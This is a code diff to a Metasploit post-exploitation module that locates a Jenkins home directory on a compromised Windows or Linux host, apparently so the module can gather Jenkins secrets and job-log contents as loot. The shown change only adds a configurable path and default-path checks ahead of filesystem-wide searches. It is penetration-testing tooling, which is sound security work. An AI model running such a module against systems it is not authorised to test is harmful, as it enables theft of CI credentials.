@@ -33,6 +33,7 @@ class MetasploitModule < Msf::Post
     )
     register_options(
       [
+        OptString.new('JENKINS_HOME', [ false, 'Set to the home directory of Jenkins. The Linux versions default to /var/lib/jenkins, but C:\\\\ProgramData\\\\Jenkins\\\\.jenkins on Windows.', ]),
         OptBool.new('STORE_LOOT', [false, 'Store files in loot (will simply output file to console if set to false).', true]),
         OptBool.new('SEARCH_JOBS', [false, 'Search through job history logs for interesting keywords. Increases runtime.', false])
       ]
@@ -348,17 +349,32 @@ class MetasploitModule < Msf::Post
   end
 
   def find_home(platform)
+    if datastore['JENKINS_HOME']
+      if exist?(datastore['JENKINS_HOME'] + '/secret.key.not-so-secret')
+        return datastore['JENKINS_HOME']
+      end
+      print_status(datastore['JENKINS_HOME'] + ' does not seem to contain secrets.')
+    end
+
     print_status('Searching for Jenkins directory... This could take some time...')
     case platform
     when 'windows'
-      case session.type
-      when 'meterpreter'
-        home = session.fs.file.search(nil, 'secret.key.not-so-secret')[0]['path']
+      if exists?('C:\\ProgramData\\Jenkins\\.jenkins\\secret.key.not-so-secret')
+        home = 'C:\\ProgramData\\Jenkins\\.jenkins\\'
       else
-        home = cmd_exec('cmd.exe', "/c dir /b /s c:\*secret.key.not-so-secret", timeout = 120).split('\\')[0..-2].join('\\').strip
+        case session.type
+        when 'meterpreter'
+          home = session.fs.file.search(nil, 'secret.key.not-so-secret')[0]['path']
+        else
+          home = cmd_exec('cmd.exe', "/c dir /b /s c:\*secret.key.not-so-secret", 120).split('\\')[0..-2].join('\\').strip
+        end
       end
     when 'nix'
-      home = cmd_exec('find', "/ -name 'secret.key.not-so-secret' 2>/dev/null", timeout = 120).split('/')[0..-2].join('/').strip
+      if exists?('/var/lib/jenkins/secret.key.not-so-secret')
+        home = '/var/lib/jenkins/'
+      else
+        home = cmd_exec('find', "/ -name 'secret.key.not-so-secret' 2>/dev/null", 120).split('/')[0..-2].join('/').strip
+      end
     end
     fail_with(Failure::NotFound, 'No Jenkins installation found or readable, exiting...') if !exist?(home)
     print_status("Found Jenkins installation at #{home}")
